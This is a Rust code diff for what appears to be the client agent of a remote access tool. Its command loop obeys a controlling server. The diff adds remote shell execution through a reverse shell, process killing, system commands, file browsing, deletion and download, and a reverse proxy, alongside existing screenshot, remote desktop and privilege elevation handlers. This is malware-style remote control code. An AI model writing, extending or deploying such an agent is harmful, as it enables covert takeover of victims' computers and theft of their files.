@@ -1,13 +1,17 @@
 use crate::features::other::{take_screenshot, client_info, visit_website, show_messagebox, elevate_client};
 use crate::features::remote_desktop::{start_remote_desktop, stop_remote_desktop, mouse_click};
-use common::async_impl::packets::*;
+use crate::features::process::{process_list, kill_process};
+use crate::features::system_commands::system_commands;
+use common::packets::*;
 use rand_chacha::ChaCha20Rng;
 use tokio::sync::oneshot;
 use tokio::sync::mpsc;
 use std::sync::Mutex;
 use once_cell::sync::Lazy;
-
-use common::async_impl::connection::{ConnectionReader, ConnectionWriter};
+use crate::REVERSE_SHELL;
+use crate::features::file_manager::FileManager;
+use crate::features::reverse_proxy::ReverseProxy;
+use common::connection::{ConnectionReader, ConnectionWriter};
 
 static PACKET_SENDER: Lazy<Mutex<Option<mpsc::Sender<ServerboundPacket>>>> = Lazy::new(|| {
     Mutex::new(None)
@@ -19,6 +23,10 @@ pub async fn reading_loop(
     secret: Option<Vec<u8>>,
     mut nonce_generator: Option<ChaCha20Rng>,
 ) {
+    let config = crate::service::config::get_config();
+    let mut reverse_proxy = ReverseProxy::new();
+    let mut file_manager = FileManager::new();
+    let mut reverse_shell_lock = crate::REVERSE_SHELL.lock().unwrap();
     'l: loop {
         match reader.read_packet(&secret, nonce_generator.as_mut()).await {
             Ok(Some(ClientboundPacket::InitClient)) => {
@@ -49,6 +57,18 @@ pub async fn reading_loop(
                 }
             }
 
+            Ok(Some(ClientboundPacket::GetProcessList)) => {
+                let process_list = process_list();
+                match send_packet(ServerboundPacket::ProcessList(process_list)).await {
+                    Ok(_) => println!("Sent process list to server"),
+                    Err(e) => println!("Error sending process list: {}", e),
+                }
+            }
+
+            Ok(Some(ClientboundPacket::KillProcess(process))) => {
+                kill_process(process.pid);
+            }
+
             Ok(Some(ClientboundPacket::Disconnect)) => {
                 println!("Server requested disconnection. Exiting program.");
                 std::process::exit(0);
@@ -60,6 +80,37 @@ pub async fn reading_loop(
                 break 'l;
             }
 
+            Ok(Some(ClientboundPacket::ManageSystem(command))) => {
+                system_commands(&command);
+            }
+            
+            Ok(Some(ClientboundPacket::AvailableDisks)) => {
+                println!("Listing available disks");
+                file_manager.list_available_disks().await;
+            }
+
+            Ok(Some(ClientboundPacket::PreviousDir)) => {
+                println!("Navigating to parent directory");
+                file_manager.navigate_to_parent().await;
+            }
+
+            Ok(Some(ClientboundPacket::ViewDir(path))) => {
+                println!("Viewing directory: {}", path);
+                file_manager.view_folder(&path).await;
+            }
+
+            Ok(Some(ClientboundPacket::RemoveDir(path))) => {   
+                file_manager.remove_directory(&path).await;
+            }
+
+            Ok(Some(ClientboundPacket::RemoveFile(path))) => {
+                file_manager.remove_file(&path).await;
+            }
+
+            Ok(Some(ClientboundPacket::DownloadFile(path))) => {
+                file_manager.download_file(&path).await;
+            }
+            
             Ok(Some(ClientboundPacket::VisitWebsite(visit_data))) => {
                 visit_website(&visit_data);
             }
@@ -84,18 +135,41 @@ pub async fn reading_loop(
                 mouse_click(click_data);
             }
 
+            Ok(Some(ClientboundPacket::StartShell)) => {
+                reverse_shell_lock.start_shell();
+            }
+
+            Ok(Some(ClientboundPacket::ExitShell)) => {
+                reverse_shell_lock.exit_shell();
+            }
+
+            Ok(Some(ClientboundPacket::ShellCommand(data))) => {
+                reverse_shell_lock.execute_shell_command(&data);
+            }
+
+            Ok(Some(ClientboundPacket::StartReverseProxy(port))) => {
+                reverse_proxy.setup(config.ip.clone(), port);
+                reverse_proxy.start().await;
+            }
+
+            Ok(Some(ClientboundPacket::StopReverseProxy)) => {
+                reverse_proxy.stop().await;
+            }
+
             Ok(Some(p)) => {
                 println!("!!Unhandled packet: {:?}", p);
             }
             
             Err(e) => {
                 println!("Connection error: {}", e);
+                reverse_shell_lock.exit_shell();
                 close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                 break 'l;
             }
             
             _ => {
                 println!("Connection closed");
+                reverse_shell_lock.exit_shell();
                 close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                 break 'l;
             }
